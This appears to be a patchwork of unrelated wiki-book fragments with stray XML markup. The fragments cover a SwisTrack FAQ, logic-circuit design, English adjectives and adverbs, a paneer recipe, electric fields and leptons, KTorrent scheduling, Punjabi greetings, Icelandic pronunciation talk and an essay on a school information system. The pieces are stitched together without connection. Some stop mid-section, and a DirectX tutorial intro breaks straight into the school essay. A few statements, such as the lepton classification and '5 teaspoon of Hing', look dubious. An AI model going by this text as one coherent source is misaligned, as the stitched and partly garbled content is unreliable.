https://swistrack.svn.sourceforge.net/svnroot/swistrack

== What is the license? ==

SwisTrack is released under the Gnu Public License (GPL).

== Is there a python interface? ==

There exists a swig wrapper for SwisTrack.  You can call SwisTrack from python and get images out for later processing.  You cannot (yet) write new components in python.

== I'm having trouble with a double image on SwisTrack. Is it because I uploaded/converted my movies on a Mac and transferred them to Windows? ==

Yes. To avoid this problem, do NOT use Mac for loading and converting. Upload the media onto the same machine loaded with SwisTrack and convert to AVI if necessary. This will prevent video upload problems as wells as double images.

      <text xml:space="preserve">I just edited the first paragraph about God and contributed the fact that many people claim to be Christian, but don't actually practice that faith. This changes the the broad statement that most of the population is Christian.
* That broad statement in the first sentence implies God in the general sense as worshipped by three major religions not just Christian. Also, statements in the first person such as,&quot;I find,&quot; are POV and negate a good effort.

      <text xml:space="preserve">==Unused Inputs==

Digital devices can only deal with signals within well defined logic levels. Signals in between these levels are said to be &quot;floating&quot; and can cause spurious and unpredicatable behaviour. It is important to connect all inputs of a logic device to &quot;high&quot; or &quot;low&quot; if they are not being used as an input, to prevent the floating input affecting the rest of circuit, or causing unnecessary power drains.

The logic level that should be applied to the input depends on the device, and what the designer wishes an unused input to signify. For example, an [[Digital Circuits/OR gate|OR gate]] would have any unused inputs tied low, as this prevents that input from affecting the output.

A simple solution is to connect the inputs of a gate together. However, this increases the capacitative load of the circuit driving the inputs and if the device contains bipolar elements, increases the DC current drain.
[[File:Unused Inputs Connected Together.svg|center]]

A better solution is to connect the unused inputs to the relevant power rails. If a logical low is needed, connect the input directly to ground, if a high is required, connect it to the positive rail either directly or through a series resistor.

[[File:Unused Inputs Connected To Rails.svg|center]]

A very similar layout can also be used to create [[Digital Circuits/Transmission Gates|transmission gates]].

==Slow Input Edge Transitions==

==Ground Bounce==

'''Ground bounce''' is a transient voltage difference between the ground reference potential on the device die and the external ground level at the device's ground pin. This oscillation is caused by the inductance of the thin wires (bond wires) connecting the die to the leadframe of the device causing a current surge upon sudden voltage changes, such as caused by a logic transition.

Ground bounce is one of the primary causes of glitches and spurious transitions in high-speed logic and can cause significant signal degradation between logic devices. This effect is most pronounced at multiple simultaneous transitions, where the joint voltage changes cause a larger current to be induced. This has lead to ground bounce also being called '''Simultaneous Switching Noise'''.

Below is a graph showing a typical (although simplified) ground bounce in a high-speed CMOS logic device. Different logic classes and manufacturing techniques have different ground bounce characteristics. The device-external properties such as circuit board geometry also have an effect. You should always check the relevant datasheet if ground bounce is expected to be a problem.

      <text xml:space="preserve">Jehovah's Witnesses is a Christian sect founded in 1931 by Joseph Franklin Rutherford. They are an offshoot of the ''Bible Students'', founded by Pastor Charles Taze Russell in the 1860s. After Russell's death in 1916, the group splintered. 

Jehovah's Witnesses are mainly known for their door-to-door evangelizing, offering copies of their journals ''THE WATCHTOWER'' and the ''AWAKE!'' 

Instead of churches, they call their meeting places of worship &quot;Kingdom Halls. They attend five (5) meetings a week, and attend larger conventions and assemblies throughout the year.

All of their study and evangelizing martials are published by the Watchtower Bible and Tract Society. Materials pertaining to the Jehovah's Witnesses about the Jehovah's Witnesses, are often published by the ''Christian Congregation of Jehovah's Witnesses''. 

Jehovah's Witnesses believe that only 144,000 receive heavenly life, while the rest of mankind will reside on a restored earth after the battle of armageddon.

They do not salute the flag, join the military or vote in elections, preferring to be neutral, being no part of this world.

They do not observe or celebrate holidays or birthdays. They do observe the annual &quot;Memorial&quot; (Lord's evening meal).

 |description=Books in this subject area deal with the '''[[w:Lisp (programming language)|Lisp]]''' family of computer programming languages with a long history and a distinctive, fully parenthesized syntax. Lisp is the second-oldest high-level programming language in widespread use today; only Fortran is older. Lisp was originally created as a practical mathematical notation for computer programs. It quickly became the favored programming language for artificial intelligence (AI) research. As one of the earliest programming languages, Lisp pioneered many ideas in computer science, including tree data structures, automatic storage management, dynamic typing, object-oriented programming, and the self-hosting compiler.

      <text xml:space="preserve">==Definition==

An adjective is a part of speech used as a modifier that describes a noun or pronoun:

1. '''Traditional''' toys are still popular.

2. You have an '''interesting''' job.

3. Your suggestions are '''helpful'''.

4. You are '''gorgeous'''.

==Positions of Adjectives==

There are three positions where an adjective can be placed - before a noun, after a noun, or in the predicate. These positions of adjectives are called attributive, postpositive and predicative respectively.

===&lt;u&gt;Attributive Position&lt;/u&gt;===

An adjective is in an attributive position when it is placed before the noun it modifies. For example,

1. I found some '''hilarious''' pictures. ('''Hilarious''' pre-modifies 'pictures'.)

2. '''Clever''' people won't stay in such an environment. ('''Clever''' pre-modifies 'people'.)

However, pronouns cannot be pre-modified.

===&lt;u&gt;Postpositive Position&lt;/u&gt;===

An adjective is in an postpositive position when it comes after the noun it modifies. Postpositive adjectives are not as common as attributive and predicative ones, but they are found in a number of fixed expressions. They are also used to post-modify indefinite pronouns because pronouns cannot be pre-modified. For example,

1. We have plenty of rooms '''available'''. ('''Available''' postmodifies 'rooms'.)

2. There is nothing '''special'''. ('''Special''' post-modifies 'nothing'. 'There is special nothing' is not acceptable.)

===&lt;u&gt;Predicative Position&lt;/u&gt;===

An adjective is in an predicative position when it is placed in the predicate of a sentence. In that case, it modifies the subject of the sentence via a linking verb or other linking mechanism. For example,

1. Most students are '''happy'''. ('''Happy''' modifies 'students' via the linking verb 'are'.)

2. She looked '''sad'''. ('''Sad''' modifies 'she' via the linking verb 'looked'.)


Most adjectives can be placed either in the attributive or the predicative positions. However, a small number of adjectives are restricted to one position only. For example, some adjectives such as 'previous' can only occur in the attributive position. For example, it is unacceptable to say 'this chapter is previous.' Conversely, some adjectives such as 'afraid' can only occur predictively. For example, it is unacceptable to say 'the afraid students did not say anything.'

==Functions of Adjectives==

There are two main uses of adjectives, namely describing and classifying.

===Describing Function/Descriptive Adjective===

An adjective can be used to describe the quality of a noun. It helps answer the question &quot;what is X like?&quot;, where X is the noun. For example,

1. The '''quick''' fox jumps over the '''lazy''' dog. ('Quick' describes the fox. 'Lazy' describes the dog.)

Describing adjectives can be modified by adverbs of degree like 'very' or 'extremely'.
====Common Descriptive Adjectives====
A common descriptive adjective is not capitalized.&lt;/br&gt;&lt;u&gt;Example:&lt;/u&gt;&lt;/br&gt;The ''sultry'' Mariah entertained her fans.
====Proper Descriptive Adjectives====
A proper descriptive adjective, being derived from a proper noun, is always capitalized.&lt;/br&gt;&lt;u&gt;Example:&lt;/u&gt;&lt;/br&gt;I prefer the ''Chinese'' deli to the ''Japanese'' restaurant.

===Classifying Function/Limiting Adjective===
An adjective can be used to classify a noun. It indicates quantity, number or a limit to the word it modifies. It helps answer the question &quot;what is the type of X?&quot;, where X is the noun. For example,

1. These two '''British''' tourists know how to speak Italian. ('British' tells us the 'type' (nationality) of the tourists.)

Classifying adjectives cannot be modified by adverbs of degree like 'very' or 'extremely'.

2. I prefer '''red''' wine to '''white''' wine. ('Very red wine' and 'very white wine' are not acceptable, because 'red' and 'white' function as classifying adjectives here.)

====Types of Limiting Adjectives====
*'''Numerical adjectives''' may be cardinal (one, two, three,...) or ordinal *first, second, third,...)
*'''Identifying adjective'''s are such, same and similar.
*'''Articles''' are ''a'' and ''an'' (indefinite articles) and ''the'' (definite articles).
*'''Nouns used as adjectives''' modify another noun or a pronoun.
*'''Pronoun Used as Adjectives'''
**'''Demonstrative adjectives''' are this, these, that and those.
**'''Possessive adjectives''' show ownership. They are my, your, his, her, its, our and their.
**'''Interrogative adjectives''' ask questions. They are which, what, whose and whose. When used they should immediately be followed by a noun.
**'''Indefinite adjectives''' are grouped into three:
***used with singular nouns - another, each, either, little, much, neither and one.
***used with plural nouns - both, few, many and several.
***used with singular or plural nouns - all, any, more, most, other and some.
*'''Verbs are used with adjectives''' when they modify a noun or a pronoun. These verbs are usually in the present participle and past participle forms.
*'''Complementary adjectives''' refer to the direct object and tell the result of the action of the verb on the direct object.

==Comparatives and Superlatives==

We change describing adjectives into comparatives and superlatives for making comparisons. The comparative form is used when one thing is compared with another. The superlative form is used when one thing is compared with any other thing in the domain of discussion.

For adjectives with more than two syllables, we always add more before the adjective to form its comparative, and most to form its superlative. For example, the two forms of 'comfortable' are 'more comfortable' and '(the) most comfortable'.

For adjectives with one or two syllables, we normally change the ending of the adjective to -er to make its comparative, and -est to make its superlative. For example, the two forms of 'fast' are 'faster' and 'fastest'.

However, there are some of these short adjectives that can only take 'more/most'. For example, the comparative form of 'active' is 'more active' instead of 'activer'.

There are even some of these adjectives that can either take 'more/most' or '-er/-est'. For example, 'commoner' and 'more common' are both acceptable.

==Order of Adjectives==

When more than one adjectives are used to describe a noun, they are usually put in a certain order. &lt;/br&gt;
&lt;center&gt;
{| border=1 cellspacing=0 cellpadding=5
|Article/Pronoun used as adjective
|-
|Intensifier
|-
|Quality
|-
|Size
|-
|Age
|-
|Color
|-
|Participle
|-
|Noun used as adjective
|-
|Head noun
|}
&lt;/center&gt;
===Examples:===
1. A '''beautiful young French''' woman (but not 'a French beautiful young woman')

2. A '''large blue paper''' bag (but not 'a paper blue large bag')

As a rule of thumb, if the adjective is more about personal opinion or judgement, it is further away from the noun. As a result, classifying adjectives are always closer to the noun than describing adjectives. We say 'expensive white wine' instead of 'white expensive wine'. If two adjectives are both classifiers, the order is usually domain specific - based on how people categorise a certain noun.

I did this because there seemed to be a lot of loose ends with this section and wanted to sum it up. There were many different clubs having the same strategies so I looked for the most common themes and wrote about them in my conclusion.</text>

'''Paneer Butter Masala''' also known as Paneer Makhani is a vegetarian dish from [[Cookbook:Cuisine of India|India]] which is also popular in the west. The dish combines paneer (Indian cottage cheese) in a butter sauce quite similar to butter chicken.

==Ingredients==
* 200 grams of [[Cookbook:Paneer|paneer]]
* 400 grams of natural [[Cookbook:Yoghurt|yoghurt]]
* 5 teaspoon of Hing
* 1 teaspoon of [[Cookbook:Ghee|ghee]]
* 1 teaspoon of Cardamom
* 1 teaspoon of [[Cookbook:Turmeric|turmeric]]
* 1 teaspoon of [[Cookbook:Garam Masala|garam masala]]
* 1 teaspoon of [[Cookbook:Chilli Powder|chilli powder]]
* 1 teaspoon of [[Cookbook:Ginger|ginger]] paste
* 5 teaspoon of [[Cookbook:Garlic|garlic]] paste
* 1 teaspoon of [[Cookbook:Cumin|cumin]]
* 1 teaspoon of [[Cookbook:Lemon Juice|lemon juice]]
* 5 green or red [[Cookbook:Chili Pepper|chillies]]
* 1 [[Cookbook:Onion|onion]]
* 1 [[Cookbook:Capsicum|capsicum]]
* 2 [[Cookbook:Tomato|tomatoes]]

==Procedure==
#Fry paneer in ghee, or spray oil if desired and store in a bowl.
#Dice and sauté onions with oil in garlic and ginger paste until golden brown.
#Add diced capsicum and tomatoes.
#In a separate pan mix ghee, hing, cardamom, turmeric, garam masala, chilli powder, lemon juice, and cumin.
#Fry for 2 minutes, then add yoghurt.
#Cook on medium heat for five minutes.
#Add onions, diced capsicum, tomatoes, and paneer.
#Cook on low heat for 15 minutes occasionally stirring.

Serve with [[Cookbook:roti|rotis]] or [[Cookbook:naan|naan]] and [[Cookbook:Rice|rice]].

For more of a gravy texture reduce amount of natural yoghurt and add full cream milk with a spoonful of corn flour as desired.

      <comment>clean up, typos fixed: An uniform → A uniform (4) using [[Project:AWB|AWB]]</comment>
      <text xml:space="preserve">Electric fields are caused by charge. This charge can be either positive or negative. Like charges repel each other, and opposite charges attract each other. If we have two point charges of charge Q and q respectively, and they are a distance r apart, the force on each of them is:

&lt;math&gt;F_{electric} = \frac{kQq}{r^2} = \frac{Qq}{4\pi \epsilon_0r^2}&lt;/math&gt;,

where k and &amp;epsilon;&lt;sub&gt;0&lt;/sub&gt; are constants (k = 8.99 x 10&lt;sup&gt;9&lt;/sup&gt; Nm&lt;sup&gt;2&lt;/sup&gt;C&lt;sup&gt;-2&lt;/sup&gt;,&amp;epsilon;&lt;sub&gt;0&lt;/sub&gt; = 8.85 x 10&lt;sup&gt;-12&lt;/sup&gt;C&lt;sup&gt;2&lt;/sup&gt;N&lt;sup&gt;-1&lt;/sup&gt;m&lt;sup&gt;-2&lt;/sup&gt;). This means that, twice as far away from the point charge, the force on another charge decreases by a factor of 4. Electric force around a point charge is very similar to gravitational force around a point mass.

A uniform electric field consists of two conducting plates. These plates are oppositely charged, and infinitely wide. Obviously, infinitely wide conducting plates do not exist, so uniform electric fields do not exist. However, fields which approximate uniform electric fields do exist, provided we look towards the middle of the plates, and the plates are not too far apart - at the ends, the formulae for uniform fields no longer apply.

The force on a charge in a uniform electric field is given by:

&lt;math&gt;F_{electric} = \frac{qV}{d}&lt;/math&gt;,

where V is the potential difference between the two plates, q is the charge of the point charge upon which the force is acting, and d is the distance between the two plates. This force remains constant as the charge travels within the electric field.

==Questions==

e = 1.6 x 10&lt;sup&gt;-19&lt;/sup&gt;C

1. A positron (charge +e) is 1 &amp;mu;m from a lithium nucleus (charge +3e). What is the magnitude of the force acting on each of the particles? In what direction is it acting?

2. An electron is 1mm from the positively charged plate in a uniform electric field. The potential difference between the plates is 20V, and the plates are 10cm apart. What force is acting on the electron? In what direction?

3. The acceleration due to gravity around a point mass is constant, irrespective of the mass of the objects it is acting on. The acceleration due to electricity around a point charge is not. Use Newton's Second Law (F=ma) to explain this.

4. An insulator contains charged particles, even though the overall charge on the insulator is 0. Why is the insulator attracted by a nearby charge?

5. Where in the charged conducting plates which create a uniform electric field would you expect to find the charge located? Why?

'''1. A positron (charge +e) is 1 &amp;mu;m from a lithium nucleus (charge +3e). What is the magnitude of the force acting on each of the particles? In what direction is it acting?'''

&lt;math&gt;F_{electric} = \frac{kQq}{r^2} = \frac{8.99 \times 10^9 \times 1 \times 3 \times (1.6 \times 10^{-19})^2}{(10^{-6})^2} = 6.90 \times 10^{-16}\mbox{ N}&lt;/math&gt;

This may seem tiny, but the mass of an electron is also tiny, so the acceleration is considerable.

'''2. An electron is 1mm from the positively charged plate in a uniform electric field. The potential difference between the plates is 20V, and the plates are 10cm apart. What force is acting on the electron? In what direction?'''

The 1mm is a red herring.

&lt;math&gt;F_{electric} = \frac{qV}{d} = \frac{1.6 \times 10^{-19} \times 20}{0.1} = 3.2 \times 10^{-17}\mbox{ N}&lt;/math&gt;

'''3. The acceleration due to gravity around a point mass is constant, irrespective of the mass of the objects it is acting on. The acceleration due to electricity around a point charge is not. Use Newton's Second Law (F=ma) to explain this.'''

&lt;math&gt;a = \frac{F}{m}&lt;/math&gt;

&lt;math&gt;a_{grav} = \frac{GMm}{mr^2} = \frac{GM}{r^2}&lt;/math&gt;

&lt;math&gt;a_{electric} = \frac{kQq}{mr^2}&lt;/math&gt;

The m cancels for gravitational acceleration, but not for electrical acceleration, since charge does not provide a resistance to a force.

'''4. An insulator contains charged particles, even though the overall charge on the insulator is 0. Why is the insulator attracted by a nearby charge?'''

The electrons in the atoms can move within certain bounds. Being in an electric field means that they spend more time closer to a positive charge, and so the parts of the insulator which are attracted to the charge end up being closer to the charge than those which are repelled. This means that the attractive force on the insulator is greater than the repulsive force. This causes the insulator as a whole to be attracted to the charge if it is positive. If it is negative, the reverse happens, and the insulator is repelled.

'''5. Where in the charged conducting plates which create a uniform electric field would you expect to find the charge located? Why?'''

The charges are free to move within a conductor. The opposite charges in each plate are attracted to each other and try to move as close to each other as possible. So, they end up on the inside edge of the plates.

      <comment>/* Lepton Number */</comment>
      <text xml:space="preserve">Leptons are particles which interact with all the fundamental forces except for the strong nuclear force. There are two types of leptons: electrons and neutrinos.

==Electrons==
Electrons are particles with a charge of -1.6 x 10&lt;sup&gt;-19&lt;/sup&gt;C. They are responsible, amongst other things, for the whole of chemistry since, as they occupy the quantum states around the nucleus. There are three types of electrons: the electron (e&lt;sup&gt;-&lt;/sup&gt;), the muon (&amp;mu;&lt;sup&gt;-&lt;/sup&gt;), and the tauon(&amp;tau;&lt;sup&gt;-&lt;/sup&gt;), one for each generation. These electrons have antiparticles, each with a charge of +1.6 x 10&lt;sup&gt;-19&lt;/sup&gt;C: the positron (e&lt;sup&gt;+&lt;/sup&gt;), the antimuon (&amp;mu;&lt;sup&gt;+&lt;/sup&gt;), and the antitauon (&amp;tau;&lt;sup&gt;+&lt;/sup&gt;), respectively.

==Neutrinos==
Neutrinos are chargeless, and almost massless. Loads of them travel around the universe and through you at speeds close to the speed of light. The symbol for a neutrino is the Greek letter nu (&amp;nu;), with its generation (e, &amp;mu; or &amp;tau;) in subscript. If it is an antineutrino, the symbol has a bar above it. So, the symbol for a muon-antineutrino is &lt;math&gt;\bar{\nu_{\mu}}&lt;/math&gt;.

==Lepton Number==
All leptons have a lepton number of 1. All antileptons have a lepton number of -1. In a nuclear reaction, the lepton number before the reaction must equal the lepton number after the reaction. This necessitates the existence of neutrinos. When a nucleus gives off a beta particle (electron), the lepton number before the emission is 0. Without neutrinos, the lepton number after the emission would be 1, not 0. In reality, an electron-antineutrino is also emitted, with a lepton number of -1, and so the total lepton number both sides of the reaction is 0.

The situation is actually slightly more complicated, as the lepton number from each generation of particles must also be conserved. The lepton number from the beta particle cannot be balanced out by a tauon-antineutrino, since this is from a different generation.

==Questions==

1. An electron is produced by a nuclear reaction, but an electron-antineutrino is not produced. What other particle is produced?

2. Why do electrons not make up part of the nucleus?

3. Why did it take until the 1950s to detect the first antineutrino?

4. Complete the following equation for the emission of a beta particle from a nucleus:

&lt;math&gt;_0^1n \to _1^1p\; +\; ?\; +\; ?&lt;/math&gt;

5. Complete the following equation for the emission of an antielectron from a  nucleus:

&lt;math&gt;_1^1p \to _0^1n\; +\; ?\; +\; ?&lt;/math&gt;

6. Complete the following equation for the capture of an electron by a nucleus:

&lt;math&gt;_1^1p + \;?\to _0^1n\; +\; ?&lt;/math&gt;

      <text xml:space="preserve">'''1. An electron is produced by a nuclear reaction, but an electron-antineutrino is not produced. What other particle is produced?'''

A positron, since this is the only other first-generation particle with a lepton number of -1.

'''2. Why do electrons not make up part of the nucleus?'''

Electrons do not interact with the strong ''nuclear'' force.

      <text xml:space="preserve">==Summary of the Lesson==

In the previous lesson, we know that an adjective can be used for giving more information about a noun. However, adjectives can only be used to modify a noun. If we want to modify a verb or an adjective, we need to use an adverb. Adverbs can also be used to modify another adverb or a clause. The following examples show how adverbs modify different parts of a sentence.

1. I '''clearly''' remember what happened. (An adverb modifying a verb.)

2. Is it '''really''' good for you?. (An adverb modifying an adjective.)

3. You are '''really''' very stupid. (An adverb modifying another adverb. 'Very' is also an adverb.)

4. '''Interestingly''', he did not discuss this topic at all. (An adverb modifying a sentence.)

An adverb that modifies and add emphasis to an adjective and another adverb is called an '''intensifier'''. Some intensifiers are ''barely, fully, hardly, little, quite, rather, really, scarcely, too'' and ''very''.

An adverb that tells ''where'' (place or direction) the action took place is a '''directive adverb'''. Some '''idioms''' are formed by combining directive adverbs and verbs. Examples are check in, set off and breakthrough.&lt;small&gt; (Note: An idiom should not be taken literally.)&lt;/small&gt;

Several '''nouns function as adverbs''' that answer the question ''Where?'' or ''When?''. Examples of these nouns used as adverbs are ''afternoons, evenings, home, month, mornings, nights, today, tomorrow, week, year'' and ''yesterday''.

==Positions of Adverbs==

Adverbs which modify adjectives or other adverbs usually immediately precede the words they modify. However, when an adverb is used to modify a verb, besides before the verb, it can also be placed after the verb, or even at the beginning or the end of a sentence. However, as we see in the following example, when an adverb modifying a verb occupies different positions, there can sometimes be subtle differences in meaning.

1. Quickly I ran away.

2. I quickly ran away.

3. I ran quickly away.

4. I ran away quickly.

==Types Adverbs==
===Adverb of Place===
An adverb of place tells ''where'' about the word it modifies.
===Adverb of Time===
An adverb of time tells ''when'' about the word it modifies.
===Adverb of Manner===
An adverb of manner tells ''how'' about the word it modifies.
===Adverb of Frequency===
An adverb of frequency tells ''to what extent'' about the word it modifies.

If you select the '''Publish for Printing''' option in the Publish menu you will create an HTML based document optimized for printing. The print option respects randomization - so you will create a different print document for each randomized version created. 

[[File:QW3 Question print out.jpg|center]]

Additionally two versions of each quiz are created - one with room for the quiz taker to write answers, and one which also includes the feedback and scoring.


[[File:QW3 Q&amp;A printout.jpg|center]]


You can use your default browser to print the quiz - Internet Explorer and the Opera browser will create the best results. As the document is HTML, it is fairly easy to change if you want to edit your quiz after publishing it. 

Question Writer uses CSS (Cascading Style Sheets) for the print option so you can completely change the design of the printed document. The template files are located in 'C:\Program Files\Question Writer\Publishing\Print' - any changes you make to these files will be reflected in all of your future printed quizzes.

=== Meeting unknown people ===

You are always formal with unknown people and therefore there is no informal dialog with them. When you meet an unknown person you introduce yourself to him or her. Here Rajeev (ਰਾਜੀਵ) and Satnam (ਸਤਿਨਾਮ) who do not know each other are meeting in a conference. This is how they interact.

'''Explanations'''
*Here Rajeev (ਰਾਜੀਵ) starts the conversation by greeting Satnam with 'ਨਮਸਕਾਰ - Namaskar' and then introduces himself by saying 'I am Rajeev. ਮੈਂ ਰਾਜੀਵ ਹਾਂ। - mein Rajeev haan'. &lt;br&gt;&lt;br&gt;
*Satnam (ਸਤਿਨਾਮ ) responds by greeting him with 'Namaskar Rajeev - ਨਮਸਕਾਰ ਰਾਜੀਵ' and also introduces himself by saying 'My name is Satnam. - ਮੇਰਾ ਨਾਮ ਸਤਿਨਾਮ ਹੈ। (Mera naam Satnam he). &lt;br&gt;&lt;br&gt;
*After the introductions Rajeev (ਰਾਜੀਵ) continues the conversation by telling Satnam 'I am very pleased to meet you - ਮਿਲ ਕੇ ਬੜੀ ਖੁਸ਼ੀ ਹੋਈ। (Mil ke badi khushi hoi). &lt;br&gt;&lt;br&gt;
*Satnam responds by saying 'So am I - ਮੈਨੂੰ ਵੀ (Meinu vi)'. Continuing the conversation he asks Rajeev 'have you also come to attend the conference? - ਕੀ ਤੁਸੀਂ ਵੀ ਕਾਨਫਰੰਸ ਵਿੱਚ ਭਾਗ ਲੈਣ ਲਈ ਆਏ ਹੋ? (ki tusi vi conference vich bhag leinh lai aye ho?) to which Rajeev confirms by saying 'Yes - ਜੀ ਹਾਂ। (Ji haan.)' &lt;br&gt;&lt;br&gt;

==== Introducing people to others ====

When a third person (say Kamala) joins in converantation between two persons 
(ਰਾਜੀਵ and ਸਤਿਨਾਮ as in the above example) and one of them (say ਰਾਜੀਵ) knows the new entrant, 
it is appropriate that he introduces the new entrant to his partner. This is how it is done.

      <text xml:space="preserve">The bandwidth scheduler allows you to set up a download schedule for each day and/or time range

The bandwidth scheduler is great if you get free downloads from your ISP during off peak periods as it allows you restrict ktorrent to only download during your ISP's off peak period.

The bandwidth scheduler also allows you to control the upload and download speeds for each period.

To use the bandwidth scheduler you must first enable it in via Plugin page in KTorrent configuration (Settings|Configure KTorrent...|Plugins)

To set up a schedule click the 'Bandwidth Schedule' tab.
Now click 'New Item'
Enter the 'From' and 'To' times that you want to have the schedule applied to.

Note: in version 3.2.1 of KTorrent there appears to be a bug in that you can't set a 'From' time after 11:00am.
To get around this create an item for 11:00am save it and then use your mouse to drag the item down to the required start time.

Select the desired dates that you want the item to apply to and then set the limits as required.

Example:
Your ISP offers free downloads between 2:00am and 12:00pm (lunch time) and you only want to download during the free periods.

You will need to add three items to handle this schedule.

   | style=&quot;border:1px solid gray;&quot;|M,T,W,T,F,S,S
   | style=&quot;border:1px solid gray;&quot;|Use the bandwidth calculator to determine 'download limit'

   | style=&quot;border:1px solid gray;&quot;|23:59
   | style=&quot;border:1px solid gray;&quot;|M,T,W,T,F,S,S
   | style=&quot;border:1px solid gray;&quot;|Select 'Stop all Torrents'
|}

&lt;br&gt;

You may want to set a download limit for Item 2 depending on how much free data you get during the off peak period.
You may also want to set an upload limit if you pay for uploads. If not then there is no need to set an upload limit unless you need other programs to access the Internet during this period.

Once you have setup a schedule you will need to restart ktorrent before it will take affect [Is this right?].

You can also save and load schedules but this isn't needed for normal operation.


You can use the following calculation to work out what upload or download limits to set.

Speed Limit (KiB/s)=(FreeGB/FreeHours/31/3600)*1024*1024

Where:&lt;br&gt;
FreeGB = the amount of free data, in Giga Bytes) you receive each MONTH.&lt;br&gt;
FreeHours = the total number of hours each DAY during which downloads are free.&lt;br&gt;

For example:&lt;br&gt;
You have 30 GB in free downloads each month.&lt;br&gt;
Any downloads between 2am and 12pm are free.&lt;br&gt;
This means that you have 14 hours of free downloads per day.

So the above equation would be:&lt;br&gt;
Speed Limit (KiB/s)=(30/14/31/3600)*1024*1024&lt;br&gt;

In this case the answer is 20 KiB/s. So you would set the download limit for 'Item 2' above to 20 KiB/s.

Bonjour. Teh letter G is called gé, not ge. Y is 'ypsilon', not ufsilon. Same with Ý. ;) FIX IT!!!!!
:Did you know you can fix it yourself? &amp;nbsp;'''&amp;mdash;&amp;nbsp;[[User:Mike.lifeguard|&lt;b style=&quot;color:#309;&quot;&gt;Mike.lifeguard&lt;/b&gt;]]'''&amp;nbsp;&amp;#124;&amp;nbsp;&lt;sup&gt;[[User talk:Mike.lifeguard|&lt;span style=&quot;color:#309;&quot;&gt;talk&lt;/span&gt;]]&lt;/sup&gt; 13:07, 3 May 2009 (UTC)
:Vah.. That was a quick reply. No, I did actually {fix it}, I didn't really notice it was part of 'wikimedia'. And I came back to hya to say it was a really nice article =D -[[User:MrGulli|MrGulli]] ([[User talk:MrGulli|talk]]) 13:14, 3 May 2009 (UTC)
Also, that 'au' in the diphthongs, it {personally} doesn't really sound like 'oi in oil...   ..Cant really think of a replacement word, should be somewhere in zhat IPA language thing.  (I'm not gonna fix that;) (just a hint) -[[User:MrGulli|MrGulli]] ([[User talk:MrGulli|talk]]) 13:23, 3 May 2009 (UTC)

:Regarding the pronounciation description for the letter &quot;U&quot;: A german &quot;ö&quot; does '''not''' sound like the &quot;oo&quot; in &quot;foot&quot; or &quot;good&quot;. --[[Special:Contributions/31.19.178.46|31.19.178.46]] ([[User talk:31.19.178.46|discuss]]) 12:25, 30 January 2014 (UTC)

== [Idea] Include Icelandic keyboard layout image ==

Why not add an image of the Icelandic keyboard layout, so that newcomers will be able to learn how to type in the Icelandic?
I think there is such an image in the Wikimedia Commons.
--[[User:Aptitudemoo|Aptitudemoo]] ([[User talk:Aptitudemoo|talk]]) 08:03, 3 July 2009 (UTC)

== U ==

:&quot;U virtually identical to a German &quot;ö&quot; (&quot;oo&quot; in &quot;foot&quot; or &quot;good&quot;)&quot;
I think this is incorrect. The Icelandic letter U is pronounced like the German &quot;ü&quot;, not &quot;ö&quot;. It is much like the French &quot;u&quot;, too. The German letter ö is pronounced the same as the Icelandic letter ö. The Icelandic letter U is not pronounced like &quot;oo&quot; in &quot;foot&quot; or &quot;good&quot;, but like ü in German ''über'', or like u in French ''cul''. It is difficult for English speakers to make that sound and to distinguish it from the Icelandic Ú sound (which is English &quot;oo&quot;, and German &quot;u&quot;). I'll change the entry. --[[User:Neitram|Neitram]] ([[User talk:Neitram|discuss]] • [[Special:Contributions/Neitram|contribs]]) 14:29, 11 February 2014 (UTC)</text>

      <text xml:space="preserve">Now that we have successfully initialized our device, we can get to the fun stuff: drawing on the screen! This is not nearly as tedious as initialization, and we can easily see the results of our hard work. We will be exploring several methods of putting primitives on the screen, and explain why some are faster than others.

'''INTRODUCTION''' 



'''Blackboard'''

In the 1980's, when you walked into a classroom, you were destined to find wooden desks, a chalkboard and a global map of the United States. Not in today's classrooms. You might still find the global map of the United States, but the wooden desk have been replaced with  metal tables and chairs and the infamous chalkboard is now a blackboard, or a web-based software through which a teacher can post classroom material, announcements, grades, etc., as well as use to teach lesson plans. Students no longer have to use their imagination to explore anything, they can just turn on a computer, click on a few links and go anywhere the World Wide Web can take them. Technology has replaced almost everything we used to do by hand. Instead of getting on that yellow school bus to go on field trips, classrooms are taking virtual field trips. We no longer have to travel across the world to learn about other cultures, students can now use videoconferencing capabilities to talk to students in the classrooms of Japan. We have evolved into a world where technology has brought about measurable changes in how our children are taught and in how they learn.
 
The Blackboard information system is not only useful to the school systems that purchase them, but also to the teachers who use them and to the students who learn through them. School administrators use blackboards to help students develop learning and innovative skills, such as creativity, critical thinking, problem solving, communication and collaboration. They also strive to bridge the gap between students and adults, such as their teachers, who are teaching the new skills and their parents who can also use the blackboard to follow their child's success.  The Partnership for 21st Century Skills, a collaboration of government, founding organizations and individual entities, work with a variety of States to &quot;design new standards, assessments, and professional development programs that prepare students with the 21st century skills they need to be successful in school, work, and life&quot; (http://www.21stcenturyskills.org/). 


'''The Design of Charlene SIS'''

The blackboard is a valuable tool in the classroom, but does it really do everything that we need it to do? The Charlene SIS is a new information system that was designed to be used inside and outside of the classroom. This system not only has blackboard capabilities, but  it provides interactive lesson plans, electronic worksheets, videoconferencing seminars, webinars for parents and so much more. This information system was designed to be an interactive learning tool for teachers, students, parents and other school officials. The Charlene SIS was designed in four stages to fit all the needs of the users: the planning stage, the analysis stage, the design stage and the implementation stage. Let's discuss these stages to see how the Charlene SIS was created and what it does.

A plan is a realistic view of your exceptions. When you're planning to design an information system, you have to set goals. It helps to know who your designing your system for, what they need the system to do, how large the system will be, what information the system will provide for tracking and data purposes and what type of equipment is needed to operate the system.  

The students, teachers, parents and school officials of Richland County School District One, in Columbia, SC participated in a survey that helped in the planning of Charlene SIS. For the students and teachers, they were asked questions about what they wanted the system to do. Some students wanted the system to be fun, colorful and interactive. Some teachers wanted it to be able to help them create lesson plans, worksheets and rubrics. They also wanted it to be able to help with newsletters and progress reports so that they could inform parents of upcoming events as well as inform them of their child's progress in class. Parents wanted to be able to communicate with teachers and they wanted to have some type of help when it came to understanding State standards, homework assignments, test scores and other matters that were communicated to them by the child or notes from the teacher, that were unclear or miscomprehended. School officials wanted to offer parents training that could be communicated through videoconferencing or webinars. This helped us know who we were designing the program for and what they needed the system to do. 

